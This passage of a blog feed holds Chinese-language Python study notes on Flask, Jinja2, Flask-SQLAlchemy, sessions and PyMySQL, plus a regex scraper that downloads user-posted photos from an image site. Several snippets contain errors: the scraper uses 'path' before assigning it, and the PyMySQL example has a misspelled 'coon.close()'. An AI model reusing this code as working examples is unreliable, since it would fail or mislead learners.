class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> url_for(<span class="string">'a'</span>,id=<span class="number">1</span>)</span><br><span class="line"><span class="meta">@app.route('/list/&lt;id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u"您请求的参数是：%s"</span> % id</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><h3 id="页面跳转和重定向"><a href="#页面跳转和重定向" class="headerlink" title="页面跳转和重定向"></a>页面跳转和重定向</h3><p>redirect()</p><h2 id="Jinja2模板"><a href="#Jinja2模板" class="headerlink" title="Jinja2模板"></a>Jinja2模板</h2><h3 id="模板渲染和参数"><a href="#模板渲染和参数" class="headerlink" title="模板渲染和参数"></a>模板渲染和参数</h3><ol><li>模板放在<code>templates</code>文件夹下</li><li>从flask中导入render_template</li><li>模板传参:创建一个字典，在render_template函数中使用**传入 </li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html里用&#123;&#123;&#125;&#125;包含变量</span><br></pre></td></tr></table></figure></li><li><p>参数也可以是对象和字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">        name = <span class="string">"廉天龙"</span></span><br><span class="line">        age = <span class="number">19</span></span><br><span class="line">    p = Person()</span><br><span class="line">    context =&#123;<span class="string">'username'</span>:<span class="string">'chenxiyuan'</span>,<span class="string">'gender'</span>:<span class="string">'男'</span>,<span class="string">'age'</span>:<span class="string">'19'</span>,<span class="string">'person'</span>:p&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名:&#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>性别:&#123;&#123; gender &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄:&#123;&#123; age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>名字:&#123;&#123; person['name'] &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄:&#123;&#123; person.age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用 &#123;% if 条件 %&#125;</span><br><span class="line">...</span><br><span class="line"> &#123;% else %&#125;</span><br><span class="line">...</span><br><span class="line"> &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for 条件 %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>|符号后接过滤器，本质是函数。</p><ol><li><p>default过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;arg|default(&apos;...&apos;)&#125;&#125;#变量不存在取默认</span><br></pre></td></tr></table></figure></li><li><p>length过滤器<br>返回长度</p><h3 id="继承和block"><a href="#继承和block" class="headerlink" title="继承和block"></a>继承和block</h3><p>父模板要写<code></code>，子模板要写自己的内容一定要放在block里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &apos;base.html&apos; %&#125;</span><br><span class="line">&#123;% block name %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="加载静态文件"><a href="#加载静态文件" class="headerlink" title="加载静态文件"></a>加载静态文件</h3><p>url_for(‘static’,filename=’路径’)</p><ol><li><p>加载css</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;lin rel=&quot;stylesheet&quot; href=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;css/index.css&apos;)&#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>加载js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;js/index.js&apos;)&#125;&#125;&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="SQLAlchemy数据库"><a href="#SQLAlchemy数据库" class="headerlink" title="SQLAlchemy数据库"></a>SQLAlchemy数据库</h2><h3 id="ORM与flask-sqlalchemy"><a href="#ORM与flask-sqlalchemy" class="headerlink" title="ORM与flask_sqlalchemy"></a>ORM与flask_sqlalchemy</h3><ol><li>ORM: Object Relationship Mapping (模型关系映射)</li><li>flask_sqlalchemy是一套ORM框架</li><li>pip install flask_sqlalchemy<h3 id="SQLAlchemy使用"><a href="#SQLAlchemy使用" class="headerlink" title="SQLAlchemy使用"></a>SQLAlchemy使用</h3></li><li><p>设置配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#新建config.py</span><br><span class="line">#配置格式:dialect+driver://username:password@host:port/database</span><br><span class="line">DIALECT = &apos;mysql&apos;</span><br><span class="line">DRIVER = &apos;pymysql&apos;</span><br><span class="line">USERNAME = &apos;root&apos;</span><br><span class="line">PASSWORD =&apos;&apos;</span><br><span class="line">HOST = &apos;127.0.0.1&apos;</span><br><span class="line">PORT = &apos;3306&apos;</span><br><span class="line">DATABASE = &apos;test&apos;</span><br><span class="line">SQLALCHEMY_DATABASE_URI=&quot;&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8&quot;.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)</span><br></pre></td></tr></table></figure></li><li><p>调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">db.create_all()</span><br><span class="line"><span class="comment"># 如果没有报错说明配置正确</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="SQLAlchemy模型与表映射"><a href="#SQLAlchemy模型与表映射" class="headerlink" title="SQLAlchemy模型与表映射"></a>SQLAlchemy模型与表映射</h3><ol><li>模型需要继承自db.Model,然后需要映射到表中的属性必须写成db.Column的数据类型</li><li>例子<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Article</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'article'</span></span><br><span class="line">    id = db.Column(db.Integer,primary_key=<span class="keyword">True</span>,autoincrement=<span class="keyword">True</span>)</span><br><span class="line">    title =db.Column(db.String(<span class="number">100</span>),nullable=<span class="keyword">False</span>)</span><br><span class="line">    content =db.Column(db.Text,nullable=<span class="keyword">False</span>)</span><br><span class="line">db.create_all()</span><br><span class="line"><span class="comment">#这时候就可以在数据库中看到已经生成了一张表</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="SQLAlchemy增删改查"><a href="#SQLAlchemy增删改查" class="headerlink" title="SQLAlchemy增删改查"></a>SQLAlchemy增删改查</h3><ol><li><p>增</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article1 =Article(title=<span class="string">'aaa'</span>,content=<span class="string">'bbb'</span>)</span><br><span class="line">db.session.add(article1)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">article1 =Article.query.filter(Article.title==<span class="string">'aaa'</span>).first()</span><br><span class="line">print(article1.title,article1.content)</span><br></pre></td></tr></table></figure></li><li><p>改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先查询改后再提交</span></span><br><span class="line">article1 =Article.query.filter(Article.title==<span class="string">'aaa'</span>).first()</span><br><span class="line">article1.title= <span class="string">'ccc'</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>删</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先查再delete后提交</span></span><br><span class="line">article1 =Article.query.filter(Article.title==<span class="string">'ccc'</span>).first()</span><br><span class="line">db.session.delete(article1)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li></ol><h3 id="SQLAlchemy外键约束"><a href="#SQLAlchemy外键约束" class="headerlink" title="SQLAlchemy外键约束"></a>SQLAlchemy外键约束</h3><ol><li>db.ForeignKey(‘table.column’)</li><li>db.relationship(‘table’,db.backref=(‘…’))</li><li>db.Table<h2 id="flask操作session"><a href="#flask操作session" class="headerlink" title="flask操作session"></a>flask操作session</h2></li><li>要从flask中导入session</li><li><p>要设置一个SECRET_KEY</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>]=os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'chenxiyuan'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br></pre></td></tr></table></figure></li><li><p>删除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.pop(<span class="string">'username'</span>)</span><br><span class="line">session.clear()</span><br></pre></td></tr></table></figure></li><li><p>获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.get(<span class="string">'username'</span>)</span><br></pre></td></tr></table></figure></li><li><p>过期时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.permanent =<span class="keyword">True</span></span><br><span class="line">app.config[<span class="string">'PERMANENT_SESSION_LIFETIME'</span>]= timedelta(days=<span class="number">7</span>)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;搭建虚拟环境&quot;&gt;&lt;a href=&quot;#搭建虚拟环境&quot; class=&quot;headerlink&quot; title=&quot;搭建虚拟环境&quot;&gt;&lt;/a&gt;搭建虚拟环境&lt;/h2&gt;&lt;p&gt;安装virtualenv&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install virtualenv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;开辟虚拟空间&lt;br&gt;&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;virtualenv flask-env&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;激活虚拟环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;linux/mac: source flask-env/bin/activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;windows: cd flask-env/Scripts 执行activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;退出虚拟环境: deactivate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>正则爬妹子图</title>
    <link href="http://chenxiyuan.vip/2019/07/09/%E6%AD%A3%E5%88%99%E7%88%AC%E5%A6%B9%E5%AD%90%E5%9B%BE/"/>
    <id>http://chenxiyuan.vip/2019/07/09/正则爬妹子图/</id>
    <published>2019-07-09T04:12:24.000Z</published>
    <updated>2019-07-09T04:23:12.283Z</updated>
    
    <content type="html"><![CDATA[<p>直接上代码吧，之前看了多线程，在这种io密集型情况下使用多线程效率会大大提高，但我写的时候就报错了，再研究一段时间再添加多线程吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dirs=<span class="string">"D:/妹子图"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">()</span>:</span>    <span class="comment">#创建文件夹</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirs):</span><br><span class="line">os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">print(<span class="string">"D:/妹子图"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"妹子图文件夹已存在"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_page</span><span class="params">()</span>:</span><span class="comment">#获取到最大的页面数</span></span><br><span class="line">url=<span class="string">"https://www.mzitu.com/zipai/"</span></span><br><span class="line">r = requests.get(url,headers=headers)</span><br><span class="line">result=re.findall(<span class="string">"&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;"</span>,r.text,re.S)</span><br><span class="line"><span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_onepage_imgs</span><span class="params">(url)</span>:</span><span class="comment">#匹配到一个页面里所有的图片地址以及上传时间</span></span><br><span class="line">        r=requests.get(url,headers=headers)</span><br><span class="line">        result=re.findall(<span class="string">'&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;'</span>,r.text,re.S)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_onepage</span><span class="params">(onepage_list)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> onepage_list:</span><br><span class="line">                <span class="keyword">global</span> a</span><br><span class="line">                path0=j[<span class="number">0</span>].split()</span><br><span class="line">                path=path0[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]+path[<span class="number">0</span>][<span class="number">5</span>:<span class="number">7</span>]+path[<span class="number">0</span>][<span class="number">8</span>:<span class="number">10</span>]+path[<span class="number">1</span>]+path[<span class="number">2</span>][<span class="number">0</span>:<span class="number">2</span>]+path[<span class="number">2</span>][<span class="number">3</span>:<span class="number">5</span>]<span class="comment">#把上传时间切片后作为文件名</span></span><br><span class="line">                img=requests.get(j[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(path+<span class="string">".jpg"</span>):<span class="comment">#因为上传时间可能相同，所以判断一下，如果相同就a+1</span></span><br><span class="line">                        a=a+<span class="number">1</span></span><br><span class="line">                        path=path+str(a)</span><br><span class="line">                        <span class="keyword">with</span> open(path+<span class="string">".jpg"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                print(<span class="string">"下载第"</span>+str(i)+<span class="string">"页提交于"</span>+path0+<span class="string">"的图片"</span>)</span><br><span class="line">                                f.write(img.content)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        a=<span class="number">1</span></span><br><span class="line">                        <span class="keyword">with</span> open(path+<span class="string">".jpg"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                print(<span class="string">"下载第"</span>+str(i)+<span class="string">"页提交于"</span>+path0+<span class="string">"的图片"</span>)</span><br><span class="line">                                f.write(img.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">        mkdir()</span><br><span class="line">        max_page=get_max_page()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(int(max_page),<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">                onepage_list=find_onepage_imgs(<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span>+ str(i)+<span class="string">"/#comments"</span> )</span><br><span class="line">                download_onepage(onepage_list)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;直接上代码吧，之前看了多线程，在这种io密集型情况下使用多线程效率会大大提高，但我写的时候就报错了，再研究一段时间再添加多线程吧。&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
      
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="爬虫" scheme="http://chenxiyuan.vip/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>python访问mysql</title>
    <link href="http://chenxiyuan.vip/2019/07/08/python%E8%AE%BF%E9%97%AEmysql/"/>
    <id>http://chenxiyuan.vip/2019/07/08/python访问mysql/</id>
    <published>2019-07-08T01:40:11.000Z</published>
    <updated>2019-07-08T02:14:07.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h2><p>这里我使用两种驱动，一个是mysql-connector另一个是PyMySQL，两个的语法都差不多,就说说pymysql吧。<br><a id="more"></a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>pip install mysql-connector</p><p>pip3 install PyMySQL</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"password"</span>,<span class="string">"database"</span>) <span class="comment">#打开数据库连接</span></span><br><span class="line"></span><br><span class="line">cursor=conn.cursor() <span class="comment">#使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">"SELECT VERSION()"</span>) <span class="comment">#使用execute()方法执行SQL查询</span></span><br><span class="line"></span><br><span class="line">data = cursor.fetchone() <span class="comment">#使用fetchone()方法获取单条数据</span></span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line">conn.close() <span class="comment">#关闭数据库连接</span></span><br></pre></td></tr></table></figure><h3 id="数据表更新"><a href="#数据表更新" class="headerlink" title="数据表更新"></a>数据表更新</h3><p>当数据表内容有更新时，必须用commit()方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"password"</span>,<span class="string">"database"</span>)</span><br><span class="line"></span><br><span class="line">cursor=conn.cursor()</span><br><span class="line"></span><br><span class="line">sql = <span class="string">"INSERT INTO table_name (field1,field2) VALUES (value1,value2)"</span></span><br><span class="line"></span><br><span class="line">cursor.execute(sql)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line">coon.close()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;驱动&quot;&gt;&lt;a href=&quot;#驱动&quot; class=&quot;headerlink&quot; title=&quot;驱动&quot;&gt;&lt;/a&gt;驱动&lt;/h2&gt;&lt;p&gt;这里我使用两种驱动，一个是mysql-connector另一个是PyMySQL，两个的语法都差不多,就说说pymysql吧。&lt;br&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
  </entry>
  
</feed>
